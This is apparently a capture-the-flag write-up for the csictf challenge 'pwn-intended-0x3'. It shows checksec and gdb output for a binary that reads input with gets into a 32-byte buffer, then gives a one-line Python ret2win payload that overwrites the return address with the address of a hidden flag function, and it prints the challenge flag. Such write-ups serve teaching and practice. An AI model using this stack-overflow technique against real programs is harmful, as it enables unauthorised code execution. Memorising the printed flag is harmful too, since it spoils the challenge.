#  pwn-intended-0x3
## Info
```
$ file pwn-intended-0x3
pwn-intended-0x3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=65cafe283997ada7631398451f05273dd0002567, for GNU/Linux 3.2.0, not stripped


$ checksec pwn-intended-0x3
[*] '/home/kl4u5/Downloads/pwn-intended-0x3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401166 <+0>:	push   rbp
   0x0000000000401167 <+1>:	mov    rbp,rsp
   0x000000000040116a <+4>:	sub    rsp,0x20
   0x000000000040116e <+8>:	mov    rax,QWORD PTR [rip+0x2eeb]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x0000000000401175 <+15>:	mov    esi,0x0
   0x000000000040117a <+20>:	mov    rdi,rax
   0x000000000040117d <+23>:	call   0x401040 <setbuf@plt>
   0x0000000000401182 <+28>:	mov    rax,QWORD PTR [rip+0x2ee7]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401189 <+35>:	mov    esi,0x0
   0x000000000040118e <+40>:	mov    rdi,rax
   0x0000000000401191 <+43>:	call   0x401040 <setbuf@plt>
   0x0000000000401196 <+48>:	mov    rax,QWORD PTR [rip+0x2ee3]        # 0x404080 <stderr@@GLIBC_2.2.5>
   0x000000000040119d <+55>:	mov    esi,0x0
   0x00000000004011a2 <+60>:	mov    rdi,rax
   0x00000000004011a5 <+63>:	call   0x401040 <setbuf@plt>
   0x00000000004011aa <+68>:	lea    rdi,[rip+0xe57]        # 0x402008
   0x00000000004011b1 <+75>:	call   0x401030 <puts@plt>
   0x00000000004011b6 <+80>:	lea    rax,[rbp-0x20]
   0x00000000004011ba <+84>:	mov    rdi,rax
   0x00000000004011bd <+87>:	mov    eax,0x0
   0x00000000004011c2 <+92>:	call   0x401060 <gets@plt>
   0x00000000004011c7 <+97>:	mov    eax,0x0
   0x00000000004011cc <+102>:	leave  
   0x00000000004011cd <+103>:	ret    
End of assembler dump.
```
By analysing the binary we say it is bufferoverflow.but it is a little trickyone because we can only gets function
on  main function.

so i tried checking for any other function . I found flag function 
```
	Non-debugging symbols:
	0x0000000000401000  _init
	0x0000000000401030  puts@plt
	0x0000000000401040  setbuf@plt
	0x0000000000401050  system@plt
	0x0000000000401060  gets@plt
	0x0000000000401070  exit@plt
	0x0000000000401080  _start
	0x00000000004010b0  _dl_relocate_static_pie
	0x00000000004010c0  deregister_tm_clones
	0x00000000004010f0  register_tm_clones
	0x0000000000401130  __do_global_dtors_aux
	0x0000000000401160  frame_dummy
	0x0000000000401166  main
	0x00000000004011ce  flag
	0x0000000000401200  __libc_csu_init
	0x0000000000401270  __libc_csu_fini
	0x0000000000401278  _fini

	disass flag 
	Dump of assembler code for function flag:
	   0x00000000004011ce <+0>:	push   rbp
	   0x00000000004011cf <+1>:	mov    rbp,rsp
	   0x00000000004011d2 <+4>:	lea    rdi,[rip+0xe5f]        # 0x402038
	   0x00000000004011d9 <+11>:	call   0x401030 <puts@plt>
	   0x00000000004011de <+16>:	lea    rdi,[rip+0xe7b]        # 0x402060
	   0x00000000004011e5 <+23>:	call   0x401050 <system@plt>
	   0x00000000004011ea <+28>:	mov    edi,0x0
	   0x00000000004011ef <+33>:	call   0x401070 <exit@plt>


	[----------------------------------registers-----------------------------------]
	RAX: 0x0 
	RBX: 0x0 
	RCX: 0x7ffff7dcfa00 --> 0xfbad208b 
	RDX: 0x7ffff7dd18d0 --> 0x0 
	RSI: 0x7ffff7dcfa83 --> 0xdd18d0000000000a 
	RDI: 0x0 
	RBP: 0x4a4a4a4a49494949 ('IIIIJJJJ')
	RSP: 0x7fffffffdf18 ("KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	RIP: 0x4011cd (<main+103>:	ret)
	R8 : 0x7ffff7dd18c0 --> 0x0 
	R9 : 0x7ffff7fe14c0 (0x00007ffff7fe14c0)
	R10: 0x3 
	R11: 0x246 
	R12: 0x401080 (<_start>:	endbr64)
	R13: 0x7fffffffdff0 --> 0x1 
	R14: 0x0 
	R15: 0x0
	EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
	[-------------------------------------code-------------------------------------]
	   0x4011c2 <main+92>:	call   0x401060 <gets@plt>
	   0x4011c7 <main+97>:	mov    eax,0x0
	   0x4011cc <main+102>:	leave  
	=> 0x4011cd <main+103>:	ret    
	   0x4011ce <flag>:	push   rbp
	   0x4011cf <flag+1>:	mov    rbp,rsp
	   0x4011d2 <flag+4>:	lea    rdi,[rip+0xe5f]        # 0x402038
	   0x4011d9 <flag+11>:	call   0x401030 <puts@plt>
	[------------------------------------stack-------------------------------------]
	0000| 0x7fffffffdf18 ("KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	0008| 0x7fffffffdf20 ("MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	0016| 0x7fffffffdf28 ("OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	0024| 0x7fffffffdf30 ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	0032| 0x7fffffffdf38 ("SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
	0040| 0x7fffffffdf40 ("UUUUVVVVWWWWXXXXYYYYZZZZ")
	0048| 0x7fffffffdf48 ("WWWWXXXXYYYYZZZZ")
	0056| 0x7fffffffdf50 ("YYYYZZZZ")
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value
	Stopped reason: SIGSEGV
	0x00000000004011cd in main ()
    ```


We have buffer 32  and we have flag function so we can overwite. thats the case if we have flag 
function also on the main function . But here we have flag function is a different function outside 
main function. so we need overwite the value of  $rbp   we need to add 8 more bits to our exploit.

## exploit  

	python -c 'print "A"*40 + "\xce\x11\x40\x00\x00\x00\x00\x00"



flag csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}